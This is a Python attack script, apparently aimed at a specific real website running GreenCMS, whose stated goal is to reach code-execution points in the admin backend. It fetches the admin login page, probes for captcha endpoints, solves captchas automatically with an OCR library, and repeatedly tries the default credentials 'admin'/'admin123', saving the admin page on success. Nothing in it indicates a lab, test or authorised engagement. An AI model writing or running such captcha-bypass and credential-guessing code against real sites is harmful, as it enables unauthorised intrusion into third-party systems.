#!/usr/bin/env python3
"""gz-dichuan GreenCMS login + explore backend for code execution points
Target: template editor, plugin manager, upload, database backup
"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://gz-dichuan.com"
LOGIN = "/index.php?m=admin&c=login&a=index"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

op, cj = get_opener()
# 1. get login page + captcha
code, final, body = fetch(op, HOST + LOGIN)
print("login page: %s size=%d" % (code, len(body)), flush=True)
cap_src = re.search(r'(?:src|data-url)["\']?\s*[:=]\s*["\']([^"\']*(?:captcha|verify|code)[^"\']*)["\']', body, re.I)
print("captcha:", cap_src.group(1) if cap_src else "?", flush=True)
# try common captcha endpoints
cap_url = None
for p in ["/index.php?m=admin&c=login&a=captcha", "/index.php?m=admin&c=captcha&a=index",
          "/index.php?m=admin&c=login&a=verify"]:
    c, f2, b = fetch(op, HOST + p, timeout=8)
    if c == 200 and len(b) > 100 and ("PNG" in b[:10].upper() or "GIF" in b[:10].upper() or len(b) > 1000):
        cap_url = p
        break
if not cap_url and cap_src:
    cap_url = cap_src.group(1)
print("captcha url:", cap_url, flush=True)

# 2. login loop
for attempt in range(5):
    if cap_url:
        code, final, cap = fetch(op, HOST + cap_url, timeout=10, referer=HOST + LOGIN)
        if isinstance(cap, str) or len(cap) < 100:
            continue
        verify = ocr_img(cap.encode("latin1"))
    else:
        verify = ""
    data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "verify": verify})
    code, final, body = fetch(op, HOST + LOGIN, data=data, referer=HOST + LOGIN)
    ok = "退出" in body or "logout" in body.lower() or "index.php?m=admin&c=index" in body or "后台首页" in body
    if ok:
        print("LOGGED IN (verify=%s)" % verify, flush=True)
        open("/tmp/gz_admin_home.html", "w").write(body)
        break
    if "验证码" in body and verify:
        print("  attempt %d: captcha fail? (%s)" % (attempt, body[:80]), flush=True)
    else:
        print("  attempt %d: pw fail? (%s)" % (attempt, body[:80]), flush=True)
